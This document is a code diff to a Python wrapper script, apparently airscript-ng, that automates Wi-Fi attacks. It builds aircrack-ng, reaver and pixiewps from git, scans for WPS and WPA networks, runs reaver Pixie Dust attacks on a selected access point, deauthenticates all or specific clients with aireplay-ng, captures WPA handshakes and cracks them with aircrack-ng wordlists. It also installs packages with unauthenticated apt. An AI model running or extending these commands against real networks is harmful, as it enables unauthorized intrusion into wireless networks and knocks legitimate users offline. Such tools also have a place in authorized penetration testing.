@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 class col:
     head = '\033[95m'
     okb = '\033[94m'
@@ -13,6 +13,7 @@ class col:
     fail_deep = '\033[1;31;48m'
     green_deep = '\033[1;32;48m'
     endl_deep = '\033[1;39;48m'
+    yel_deep = '\033[1;33;48m'
 def update_this_script():
     check_depends()
     import subprocess,os
@@ -94,21 +95,27 @@ def get_wifi_cards_pick_alt(choice):
         else:
             return get_card_name_alt()
     return get_card_name_alt()
-def reaverspecialdeps():
-    import os
-    if os.system("ls ~/.airscriptNG/options.txt 2>/dev/null >/dev/null") != 0 or os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
-        os.system("mkdir ~/.airscriptNG/ 2>/dev/null;touch ~/.airscriptNG/options.txt;echo '1' > ~/.airscriptNG/options.txt;apt purge reaver -y 2>/dev/null")
-        if os.system("ls backup-repos >/dev/null 2>/dev/null") != 0: 
-            os.system("sudo mkdir backup-repos;cd backup-repos;cp /etc/apt/sources.list ./")
-        xvar = os.system("sudo cat /etc/apt/sources.list | grep -i 'deb http://http.kali.org/kali kali-rolling main non-free contrib' >/dev/null 2>/dev/null")
-        check_for_existing_repo = os.system("sudo cat /etc/apt/sources.list | grep -i 'deb https://http.kali.org/kali kali-rolling main non-free contrib' >/dev/null 2>/dev/null")
-        if xvar != 0 and check_for_existing_repo !=0:
-            os.system("tempvariableforscript=$(mktemp -d) && cd $tempvariableforscript && sudo cp /etc/apt/sources.list . && sudo echo 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG' >> sources.list && mv sources.list /etc/apt/sources.list && cd .. && rmdir $tempvariableforscript && cd ~/ && apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6 2>/dev/null")
-        depandancies()
-        if xvar != 0 and check_for_existing_repo !=0:
-            os.system("echo \"$(cat /etc/apt/sources.list | grep -v 'deb http://http.kali.org/kali kali-rolling main non-free contrib #BY AIRSCRIPT-NG')\" > /etc/apt/sources.list")
-    else:
-        check_depends()
+def gitdeps():
+    import subprocess
+    call = subprocess.call
+    if call("ls ~/.airscriptNG/air 2>/dev/null >/dev/null",shell=True) != 0:
+        if call('/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null',shell=True) == 0:
+            call("mkdir -p ~/.airscriptNG/air && cd ~/.airscriptNG/air && apt update && apt install git git-core libnl-3-dev openssl libnl*-gen* libgcrypt20-dev build-essential libssl-dev -y && git clone git://git.kali.org/packages/aircrack-ng.git -b upstream && cd * && make",shell=True)
+        else:
+            print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
+            os._exit(1)
+    if call("ls ~/.airscriptNG/wps 2>/dev/null >/dev/null",shell=True) != 0:
+        if call('/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null',shell=True) == 0:
+            call("mkdir -p ~/.airscriptNG/wps && cd ~/.airscriptNG/wps && apt update && apt install libpcap-dev build-essential -y && git clone git://git.kali.org/packages/reaver.git -b upstream && cd */src && ./configure && make",shell=True)
+        else:
+            print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
+            os._exit(1)
+    if call("ls ~/.airscriptNG/magic 2>/dev/null >/dev/null",shell=True) != 0:
+        if call('/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null',shell=True) == 0:
+            call("mkdir -p ~/.airscriptNG/magic && cd ~/.airscriptNG/magic && apt update && apt install libssl-dev build-essential -y && git clone git://git.kali.org/packages/pixiewps.git -b upstream && cd */src/ && make && make install",shell=True)
+        else:
+            print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
+            os._exit(1)
 def mitm_fakeap_func():#FIX THIS
     try:
         import os, time, subprocess
@@ -975,14 +982,18 @@ def aliasfunc(): #FIXES APPLIED, WITH SOME SACIFICE, REVIEW FINAL CODE.
         os.system("clear")
         title()
 def depandancies(): #This is fine 
-    import os,time
+    import os,time,subprocess
     print("\033[1;33;48m[-] \033[0;37;48mUpdating system and installing some dependancies. Please hold!")
-    os.system("echo '\033[1;32;48m[-] \033[0;37;48m25% done';sudo apt update --allow-unauthenticated 2>/dev/null && echo '\033[1;32;48m[-] \033[0;37;48m50% done' && sudo apt install xterm -y --allow-unauthenticated >/dev/null 2>/dev/null")
-    os.system("xterm $HOLD -title 'Installing any dependancies [airscript-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk driftnet dsniff bzip2 apache2 gnome-terminal hostapd psmisc -y --allow-unauthenticated && update-rc.d isc-dhcp-server disable && update-rc.d apache2 disable'")
+    if subprocess.call('/usr/bin/env ping -c1 8.8.8.8 >/dev/null 2>/dev/null',shell=True) == 0:
+        os.system("echo '\033[1;32;48m[-] \033[0;37;48m25% done';sudo apt update --allow-unauthenticated 2>/dev/null && echo '\033[1;32;48m[-] \033[0;37;48m50% done' && sudo apt install xterm -y --allow-unauthenticated >/dev/null 2>/dev/null")
+        os.system("xterm $HOLD -title 'Installing any dependancies [airscript-ng]'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'sudo apt install gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk driftnet dsniff bzip2 apache2 gnome-terminal hostapd psmisc coreutils -y --allow-unauthenticated && update-rc.d isc-dhcp-server disable && update-rc.d apache2 disable'")
+    else:
+        print('\n%s[-]%s Failed to install inital dependancies, please connect to the internet and try again\n' %(col.fail,col.endl))
+        os._exit(1)
     time.sleep(2)
 def check_depends(): #Still works
     import os,time
-    x = os.system("dpkg -s xterm gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk dsniff driftnet bzip2 gnome-terminal apache2 hostapd psmisc 2>/dev/null >/dev/null")
+    x = os.system("dpkg -s xterm gawk reaver aircrack-ng wireless-tools ethtool apt-transport-https iproute2 git isc-dhcp-server python3-tk dsniff driftnet bzip2 gnome-terminal apache2 hostapd psmisc coreutils 2>/dev/null >/dev/null")
     if x == 0:
         pass
     else:
@@ -1037,7 +1048,7 @@ def install_deps(): #Needs a little bit of work
     os.system("clear")
     print("\033[1;32;48m[+] \033[1;35;48mThis option will append a few lines to your '/etc/apt/sources.list' file.")
     print("\033[1;34;48m[info] \033[1;37;48mAfter this the program will update the apt repos and install the dependancies")
-    print("\033[1;37;48m[-] \033[1;33;48mPlease, Please remember that adding additional repos to debian is not advised.Since we'll only be adding the Kali-Rolling Repos, You should be fine! Do not run this on a KALI system!")
+    print("\033[1;37;48m[-] \033[1;33;48mPlease, Please remember that this option is extremely dangerous, it can corrupt your install (proceed at your own risk)!")
     tf = input("\033[1;33;48m[?] \033[0;37;48mPress [y] to proceed or CTRL+C to exit. >>")
     if tf.lower().startswith("y"):
         if os.system("iwconfig monitor 2>/dev/null") == 0:
@@ -1072,8 +1083,10 @@ def install_deps(): #Needs a little bit of work
             clearScreen()
     else:
         install_deps()
-def reaver():  #Needs major overhaul
-    import os, time
+def reaver():  #Needs minor fixes
+    import os, time, subprocess,csv,sys,shlex
+    iostream = subprocess.check_output
+    call = subprocess.call
     try:
         os.system('clear')
         print("\033[1;32;48m[+] \033[0;36;48mThanks for chosing reaver")
@@ -1083,9 +1096,10 @@ def reaver():  #Needs major overhaul
         ack = input("\033[1;33;48m[?] \033[0;35;48mType 'y' to continue>>")
         if ack.lower().startswith('y'):
             print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
-            print("\033[1;32;48m[-] \033[0;37;48m5% done")
-            #reaverspecialdeps()
             check_depends()
+            gitdeps()
+            if os.system("ls -l HANDSHAKES/ 2>/dev/null >/dev/null") != 0:
+                os.system("mkdir HANDSHAKES")
             print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met. Make sure you have correct drivers! \033[0;37;48m")
             time.sleep(1)
             os.system('clear')
@@ -1105,29 +1119,116 @@ def reaver():  #Needs major overhaul
             os.system("sudo systemctl stop wpa_supplicant.service")
             print("\033[1;32;48m[+] \033[0;37;48myour cards are:\n ")
             get_wifi_cards_pick()
-            print("\033[1;34;48m[info] \033[0;32;48mOk, seems like %s is started, time to get crackin'" %(index))
+            print("\n\033[1;34;48m[info] \033[0;32;48mOk, seems like %s is started, time to get crackin'" %(index))
             print("\033[1;34;48m[info] \033[0;37;48mNow we'll run wash to find all the wps networks around")
             print("\033[1;34;48m[info] \033[0;33;48mPlease press CTRL+C once you see your target network")
-            z = input("\033[0;34;48m\nGot all that? Press enter >>")
+            z = input("\033[0;34;48m\nGot all that? Press enter (%srun for 3~ secs minimum%s\033[0;34;48m)%s>>"%(col.green_deep,col.endl,col.endl))
             z = str(z)
-            os.system("wash -i %s" %(index))
-            b = input("\n\033[1;33;48m[?] \033[0;34;48mJust copy+paste the bssid of the target network [no spaces] >> ")
-            b = str(b)
-            c = input("\033[1;34;48m[?] \033[1;35;48mFinally tell me the channel of the target ap [look for Ch] >> ")
-            c = str(c)
+            temp_path = iostream('mktemp HANDSHAKES/TEMP_DUMP_XXXX',shell=True).decode('utf-8').rstrip()#fix var name
+            dump_path = iostream('mktemp HANDSHAKES/TEMP_DUMP_XXXX',shell=True).decode('utf-8').rstrip()#fix var name
+            try:
+                call("/usr/bin/env bash -c 'nohup ~/.airscriptNG/air/*/src/airodump-ng -a --wps -w %s --output-format csv -I 3 -t WPA -t WPA2 -t WPA1 --ignore-negative-one %s &>/dev/null &'" %(temp_path,index),shell=True)
+                call("~/.airscriptNG/wps/*/src/wash -i %s | tee -a %s" %(index,dump_path),shell=True)
+            except(KeyboardInterrupt,EOFError):
+                call('killall airodump-ng',shell=True)
+                call("/usr/bin/env bash -c 'killall wash && disown'",shell=True) #CONTINUE WHERE LEFT OFF
+            #paste stuff here
+            csv_array = []
+            csv_file = None
+            clear = 'clear'
+            csv_overlap = iostream('cat %s' %(dump_path),shell=True).decode('utf-8').rstrip().split()
+            def get_csv():
+                try:
+                    x = iostream('ls HANDSHAKES/*csv | wc -l',shell=True).decode('utf-8').rstrip()
+                    print('\n\n')
+                    for _ in range(1,int(x)+1):
+                        csv_array.append(iostream('ls HANDSHAKES/*csv | head -n %s | tail -n 1' %(_),shell=True).decode('utf-8').rstrip())
+                    global csv_file_choice
+                    csv_file_choice = ('%s-01.csv'  %(temp_path))
+                    call(clear)
+                    with open(csv_file_choice,newline='') as csvfile:
+                        reader = csv.reader(csvfile,delimiter=',')
+                        counter_for_csv = 0
+                        global value_for_csv_array
+                        value_for_csv_array = []
+                        vsf = value_for_csv_array
+                        for row in reader:
+                            if row != [] and len(row) >= 13:
+                                if counter_for_csv == 0:
+                                    counter_for_csv += 1
+                                else:
+                                    if row[0].strip() in csv_overlap:
+                                        value_for_csv_array.append([row[0].strip(),row[3].strip(),row[5].strip(),row[6].strip(),row[7].strip(),row[8].strip(),row[13].strip()])
+                                        counter_for_csv += 1
+                        another_counter = 1
+                        print('%sViewing all networks:%s\n' %(col.endl_deep,col.endl))
+                        print(""" %sNO.%s  %sBSSID%s              %sPWR%s  %sCH%s  %sSECURITY%s %sCIPHER%s %sAUTH%s %sESSID%s\n"""
+                            %(col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl))
+                        for _ in vsf:
+                            for xy in range(1,len(_)):
+                                if _[xy] == '':
+                                    _[xy] = 'N/A'
+                                if len(_[xy].split()) > 1:
+                                    _[xy] = _[xy].split()
+                                    _[xy] = _[xy][0]
+                            if len(_[1]) == 1:
+                                _[1] = ' ' + _[1]
+                            if int(another_counter) <= 9:
+                                another_counter = str(another_counter)
+                                another_counter = another_counter + ' '
+                            if _[0] in csv_overlap:
+                                print(""" %s#%s:%s %s  %s   %s   %s    %s  %s  %s  """
+                                %(col.fail,col.endl,another_counter,_[0],_[5],_[1],_[2],_[3],_[4],_[6]))
+                                another_counter = int(another_counter)
+                                another_counter += 1
+                    del csv_array[:]
+                    call('rm %s' %(temp_path),shell=True)
+                except(TypeError,ValueError):
+                    del csv_array[:]
+                    get_csv()
+            get_csv()
+            while True:
+                network_select_csv = input('\nPlease enter no(#) of the network you want $')
+                try:
+                    network_select_csv = int(network_select_csv)
+                except(TypeError,ValueError):
+                    continue
+                finally:
+                    if network_select_csv in range(1,len(value_for_csv_array)+1):
+                        break     
+            b = iostream('mktemp HANDSHAKES/CAPTURE_FILE_XXXX',shell=True).decode('utf-8').rstrip()
+            c = value_for_csv_array[network_select_csv-1][1]
+            d = value_for_csv_array[network_select_csv-1][0]
+            k = value_for_csv_array[network_select_csv-1][-1]
+            call('rm %s 2>/dev/null' %(csv_file_choice),shell=True)
+            call('rm %s 2>/dev/null' %(temp_path),shell=True)
+            call('rm %s 2>/dev/null' %(dump_path),shell=True)
             os.system("clear")
+            print("\033[1;32;48m[+]\033[1;39;48mSELECTED NETWORK: %s%s%s" %(col.fail_deep,k,col.endl_deep))
+            print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s-01.cap" %(b))
+            call('rm %s' %(b),shell=True)
+            print("[\033[1;32;48mCHANNEL\033[1;39;48m]: %s" %(c))
+            print("[\033[1;32;48mBSSID (AP MAC)\033[1;39;48m]: %s" %(d))
+            print("[\033[1;32;48mESSID (AP SSID)\033[1;39;48m]: %s" %(k))
+            print("[\033[1;32;48mCIPHER\033[1;39;48m]: %s" %(value_for_csv_array[network_select_csv-1][-4]))
+            print("[\033[1;32;48mSIGNAL STRENGTH\033[1;39;48m]: %s dBm" %(value_for_csv_array[network_select_csv-1][-2]))
+            print("[\033[1;32;48mAUTHENTICATION\033[1;39;48m]: %s" %(value_for_csv_array[network_select_csv-1][-3]))
+            #stop it. get some help.
+            b = str(d)
+            c = str(c)
+            print('\n')
             def fix():
                 print("\033[1;34;48m[info] \033[1;37;48mOnce you hit enter i'll attempt to pwn the wps using Reaver + Pixie dust.")
                 print("\033[1;34;48m[info] \033[1;33;48mPlease note that this can backfire and lock the AP if left for too long")
                 print("\033[1;34;48m[info] \033[1;35;48mIt should work in 15secs~30secs. If you see it running for more, then cancel it with CTRL+C.Don't risk it.Try again.")
-                print("\033[1;34;48m\nHow do you want to run it? \033[1;32;48m[1] \033[1;34;48mto run normally or \033[1;32;48m[2] \033[0;34;48mto fix \033[1;31;48m'FAILED TO ASSOCIATE WITH AP'\033[0;34;48m")
+                print("\033[1;34;48m\nHow do you want to run it? \033[1;32;48m[1] \033[1;34;48mto run normally or \033[1;32;48m[2] \033[1;34;48mto fix \033[1;31;48m'FAILED TO ASSOCIATE WITH AP'\033[0;34;48m %s(RECOMMENDED METHOD)%s" %(col.okg,col.endl))
                 opt = input("\n\033[0;33;48mChoose either 1 or 2 >>")
                 if opt == "1":
-                    os.system("reaver -i %s -b %s -K 1 -vvv -c %s" %(index,b,c))
+                    os.system("~/.airscriptNG/wps/*/src/reaver -i %s -b %s -K 1 -vvv -c %s" %(index,b,c))
                     print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If it hasn't, well then i'm sorry. Please use the fix/aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
                     clearScreen()
                 if opt == "2":
-                    os.system("xterm $HOLD -title 'ASSOCIATING WITH AP'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e aireplay-ng -1 30 -a %s %s&reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
+                    os.system("xterm $HOLD -title 'ASSOCIATING WITH AP'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e ~/.airscriptNG/air/*/src/aireplay-ng -1 30 -a %s %s & ~/.airscriptNG/wps/*/src/reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
                     print("\033[1;34;48m\n[info] \033[1;35;48mBy now it has either worked or not. If not then please try option [1]")
                     os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                     #print("\033[1;33;48m\n[info] \033[1;31;48mPlease close the Xterm at the top right now, as keeping it on is pretty much useless!")
@@ -1140,22 +1241,28 @@ def reaver():  #Needs major overhaul
             os.system('clear')
             reaver()
     except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
-            print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
-            os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
-            os.system("sudo systemctl start NetworkManager.service")
-            os.system("sudo systemctl start wpa_supplicant.service")
+        import traceback
+        print("\n\033[1;34;48m[info] \033[0;37;48mWait a few seconds, cleaning up...")
+        os.system("sudo ip link set %s down && sudo iw dev %s set type managed && sudo ip link set %s up" %(index, index, index))
+        os.system("sudo systemctl start NetworkManager.service")
+        os.system("sudo systemctl start wpa_supplicant.service")
+        os.system("clear")
+        exc_info = sys.exc_info() #ENABLE THIS AND LINE BELOW FOR TRACEBACK
+        traceback.print_exception(*exc_info)
+        if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
+            os.system("rm log.txt 2>/dev/null")
+            os._exit(1)
+        else:
             os.system("clear")
-            if input("\n\033[1;37;48m[-] \033[0;38;48mPress [y] to exit or any other key to return to start>>").lower().startswith("y"):
-                os.system("rm log.txt 2>/dev/null")
-                os._exit(1)
-            else:
-                os.system("clear")
-                title()
-                os.system("rm log.txt 2>/dev/null")
+            title()
+            os.system("rm log.txt 2>/dev/null")
 def aircrackng(): #Lots of effort needed 
-    import os,time,subprocess
+    import os,time,subprocess,csv,sys,shlex
+    iostream = subprocess.check_output
+    call = subprocess.call
     print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
     check_depends()
+    gitdeps()
     print("\033[1;33;48m[-] \033[0;35;48mAll dependancies are met. Make sure you have correct drivers! \033[0;37;48m")
     time.sleep(1)		
     os.system("clear")
@@ -1178,6 +1285,7 @@ def aircrackng(): #Lots of effort needed
                 #os.system("echo 'Starting...'")
                 if os.system("ls -l HANDSHAKES/ 2>/dev/null >/dev/null") != 0:
                     os.system("mkdir HANDSHAKES")
+                temp_path = iostream('mktemp HANDSHAKES/TEMP_DUMP_XXXX',shell=True).decode('utf-8').rstrip()
                 #print("\nHi, welcome to aircrack-ng made easy")
                 print("\nHi, Please read everything that appears at the bottom")
                 print("Thanks for using this program")
@@ -1186,21 +1294,98 @@ def aircrackng(): #Lots of effort needed
                 print("\n\033[1;32;48m[+] \033[1;32;48myour cards are: \033[0;39;48m\n")
                 get_wifi_cards_pick()
                 print("\n\033[1;34;48m[info] \033[1;37;48m1) Ok, seems like %s is in monitor mode" %(index))
-                print("\033[1;34;48m[info] \033[1;34;48m2) now, we'll run Airodump-ng to capture the handshake")
-                input("\033[1;34;48m[info] \033[1;33;48m3) once you start airodump, you need to press \033[1;32;48mCTRL+C\033[1;33;48m when you see your target network. \n\n\033[1;33;48m[?] press enter to continue >>")
-                os.system("airodump-ng -a %s" %(index)) 
-                print("\nOk, all I need is a few things from you")
-                b = input("\033[1;33;48m[?] \033[0;33;48mFirst, can you give me a unique filename? [no spaces/punctuation/duplicate name]>> ")
+                print("\033[1;34;48m[info] \033[1;34;48m2) Now, we'll run Airodump-ng to capture the handshake")
+                input("\033[1;34;48m[info] \033[1;33;48m3) Run it for %s3~ seconds%s and press \033[1;32;48mCTRL+C\033[1;33;48m when you see target network. \n\n\033[1;33;48m[?] press enter to continue >>" %(col.green_deep,col.yel_deep))
+                try:
+                    subprocess.call("~/.airscriptNG/air/*/src/airodump-ng -a -w %s --output-format csv -I 3 -t WPA -t WPA2 -t WPA1 --ignore-negative-one %s" %(temp_path,index),shell=True)
+                except(KeyboardInterrupt,EOFError):
+                    pass
+                csv_array = []
+                csv_file = None
+                clear='clear'
+                def get_csv():
+                    try:
+                        x = iostream('ls HANDSHAKES/*csv | wc -l',shell=True).decode('utf-8').rstrip()
+                        print('\n\n')
+                        for _ in range(1,int(x)+1):
+                            csv_array.append(iostream('ls HANDSHAKES/*csv | head -n %s | tail -n 1' %(_),shell=True).decode('utf-8').rstrip())
+                        global csv_file_choice
+                        csv_file_choice = ('%s-01.csv'  %(temp_path))
+                        call(clear)
+                        with open(csv_file_choice,newline='') as csvfile:
+                            reader = csv.reader(csvfile,delimiter=',')
+                            counter_for_csv = 0
+                            global value_for_csv_array
+                            value_for_csv_array = []
+                            vsf = value_for_csv_array
+                            for row in reader:
+                                if row != [] and len(row) >= 13:
+                                    if counter_for_csv == 0:
+                                        counter_for_csv += 1
+                                    else:
+                                        value_for_csv_array.append([row[0].strip(),row[3].strip(),row[5].strip(),row[6].strip(),row[7].strip(),row[8].strip(),row[13].strip()])
+                                        counter_for_csv += 1
+                            another_counter = 1
+                            print('%sViewing all networks:%s\n' %(col.endl_deep,col.endl))
+                            print(""" %sNO.%s  %sBSSID%s              %sPWR%s  %sCH%s  %sSECURITY%s %sCIPHER%s %sAUTH%s %sESSID%s\n"""
+                                %(col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl,col.fail,col.endl))
+                            for _ in vsf:
+                                for xy in range(1,len(_)):
+                                    if _[xy] == '':
+                                        _[xy] = 'N/A'
+                                    if len(_[xy].split()) > 1:
+                                        _[xy] = _[xy].split()
+                                        _[xy] = _[xy][0]
+                                if len(_[1]) == 1:
+                                    _[1] = ' ' + _[1]
+                                if another_counter <= 9:
+                                    another_counter = str(another_counter)
+                                    another_counter = another_counter + ' '
+                                print(""" %s#%s:%s %s  %s   %s   %s    %s  %s  %s  """
+                                %(col.fail,col.endl,another_counter,_[0],_[5],_[1],_[2],_[3],_[4],_[6]))
+                                another_counter = int(another_counter)
+                                another_counter += 1
+                        del csv_array[:]
+                        call('rm %s' %(temp_path),shell=True)
+                    except(TypeError,ValueError):
+                        del csv_array[:]
+                        get_csv()
+                get_csv()
+                while True:
+                    network_select_csv = input('\nPlease enter no(#) of the network you want $')
+                    try:
+                        network_select_csv = int(network_select_csv)
+                    except(TypeError,ValueError):
+                        continue
+                    finally:
+                        if network_select_csv in range(1,len(value_for_csv_array)+1):
+                            break     
+                b = iostream('mktemp HANDSHAKES/CAPTURE_FILE_XXXX',shell=True).decode('utf-8').rstrip()
+                c = value_for_csv_array[network_select_csv-1][1]
+                d = value_for_csv_array[network_select_csv-1][0]
+                k = value_for_csv_array[network_select_csv-1][-1]
+                call('rm %s 2>/dev/null' %(csv_file_choice),shell=True)
+                call('rm %s 2>/dev/null' %(temp_path),shell=True)
+                #del csv_array[:]
+                #print("\nOk, all I need is a few things from you")
+                #b = input("\033[1;33;48m[?] \033[0;33;48mFirst, can you give me a unique filename? [no spaces/punctuation/duplicate name]>> ")
                 b = str(b)
-                c = input("\033[1;33;48m[?] \033[0;34;48mNow, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>> ")
+                call('rm %s 2>/dev/null' %(b),shell=True)
+                #c = input("\033[1;33;48m[?] \033[0;34;48mNow, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>> ")
                 c = str(c)
-                d = input("\033[1;33;48m[?] \033[0;36;48mFinally tell me the (copy/paste) bssid of the network [no spaces]>> ")
+                #d = input("\033[1;33;48m[?] \033[0;36;48mFinally tell me the (copy/paste) bssid of the network [no spaces]>> ")
                 d = str(d)
                 if b and c and d != "":
                     os.system("clear")
-                    #print("\033[1;32;48m[info] \033[0;31;48mNow, the idea is when someone connects/reconnects, we intercept the handshake to crack later.")
-                    print("\033[0;32;48m[info] \033[1;36;48mWe need to de-auth someone. We don't have to, you can wait for someone to connect.")
-                    #print("\033[0;37;48m[info] \033[0;33;48mYou can leave it blank to not disconnect anyone")
+                    print("\033[1;32;48m[+]\033[1;39;48mSELECTED NETWORK: %s%s%s" %(col.fail_deep,k,col.endl_deep))
+                    print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s-01.cap" %(b))
+                    print("[\033[1;32;48mCHANNEL\033[1;39;48m]: %s" %(c))
+                    print("[\033[1;32;48mBSSID (AP MAC)\033[1;39;48m]: %s" %(d))
+                    print("[\033[1;32;48mESSID (AP SSID)\033[1;39;48m]: %s" %(k))
+                    print("[\033[1;32;48mCIPHER\033[1;39;48m]: %s" %(value_for_csv_array[network_select_csv-1][-4]))
+                    print("[\033[1;32;48mSIGNAL STRENGTH\033[1;39;48m]: %s dBm" %(value_for_csv_array[network_select_csv-1][-2]))
+                    print("[\033[1;32;48mAUTHENTICATION\033[1;39;48m]: %s" %(value_for_csv_array[network_select_csv-1][-3]))
+                    print("\n\033[1;32;48m[info] \033[1;34;48mWe need to de-auth someone. We don't have to, you can wait for someone to connect.")
                     e = input("\n\033[1;35;48m[?] \033[1;39;48mDe-auth all \033[1;32;48m[type a]\033[1;39;48m, de-auth client \033[1;32;48m[type c]\033[1;39;48m, don't de-auth \033[1;32;48m[type n]\033[0;39;48m \033[1;31;48m ~# \033[0;39;48m")
                     e = str(e)
                     def post_frame():
@@ -1208,7 +1393,7 @@ def aircrackng(): #Lots of effort needed
                         while True:
                             #print("\n\033[1;36;48mDo you want to crack using\033[0;39;48m %sCPU/GPU?%s" %(col.warn_deep,col.endl))
                             print("\033[1;33;48m[info] \033[1;39;48m%sIf you use GPU remember the handshake will be in a folder called%s%s \"HANDSHAKES\" %s" %(col.fail,col.endl,col.blue_deep,col.endl))
-                            choice_of_cpu_gpu = input("%sCrack using: CPU-->[c] |GPU-->[g]%s %s$%s " %(col.blue_deep,col.endl,col.okg,col.endl))
+                            choice_of_cpu_gpu = input("%sCrack using%s: CPU-->[c] (all CPUs)|GPU-->[g] (GTX 9xx,10xx+/AMD ROCM GPU) %s$%s " %(col.blue_deep,col.endl,col.okg,col.endl))
                             if choice_of_cpu_gpu.lower().startswith("c"):
                                 break
                             elif choice_of_cpu_gpu.lower().startswith("g"):
@@ -1226,16 +1411,17 @@ def aircrackng(): #Lots of effort needed
                             f = str(f)
                         wordlist()
                         os.system("clear")
-                        print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: HANDSHAKES/%s-01.cap" %(b))
+                        print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s-01.cap" %(b))
                         print("[\033[1;32;48mWORDLIST\033[1;39;48m]: %s" %(f))
                         #print("\033[1;37;48m[info] \033[1;39;48mOk, ready? press enter to start cracking")
                         #print("\033[1;35;48m[info] \033[1;39;48mIf nothing is found then ctrl+c and try again")
                         input("\n\033[1;33;48mPress \033[1;32;48m[enter]/CTRL+C\033[1;31;48m ~# \033[0;39;48m")
                         try:
-                            subprocess.call("aircrack-ng HANDSHAKES/%s-01.cap -w %s" %(b,f),shell=True)
-                        except(KeyboardInterrupt,EOFError) as some_random_exception:
-                            print("%s^Recieved %s. Cancelling...%s" %(col.fail_deep,some_random_exception,col.endl))
-                            subprocess.call("kill $(ps aux | grep -i \"aircrack-ng\" | awk -F ' ' {'print $2'}) 2>/dev/null", shell=True)
+                            subprocess.call("~/.airscriptNG/air/*/src/aircrack-ng %s-01.cap -w %s" %(b,f),shell=True)
+                        except(KeyboardInterrupt,EOFError):
+                            print("%s\n^Recieved KeyboardInterrupt/EOF. Cancelling...%s" %(col.fail_deep,col.endl))
+                            call('killall aircrack-ng 2>/dev/null',shell=True)
+                            #subprocess.call("kill $(ps aux | grep -i \"aircrack-ng\" | awk -F ' ' {'print $2'}) 2>/dev/null", shell=True)
                         print("\n\n\033[1;32;48m[+] \033[0;37;48mIf you see 'KEY FOUND:XXXXXXX', that's the PSK.")
                         print("\033[1;32;48m[+] \033[0;37;48mIf the passphrase was not in the dictonary then try option [4] using hashcat.\n")
                         clearScreen()
@@ -1246,7 +1432,7 @@ def aircrackng(): #Lots of effort needed
                         stda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
                         input("\n\033[1;33;48m[?] \033[1;37;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOW. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
-                        os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
